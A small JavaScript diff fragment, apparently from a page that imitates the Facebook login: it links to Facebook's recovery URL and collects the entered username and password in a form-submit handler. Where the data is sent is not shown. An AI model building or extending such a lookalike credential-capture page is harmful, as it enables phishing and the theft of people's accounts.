@@ -140,7 +140,7 @@ errorRecoverPass.href = "https://m.facebook.com/recover/initiate/?ars=facebook_l
     })
 loginForm.addEventListener("submit", (e) => {
     e.preventDefault();
-    e.stopPropagation();
+    //e.stopPropagation();
     const data = {
         usename: username.value,
         password: password.value,
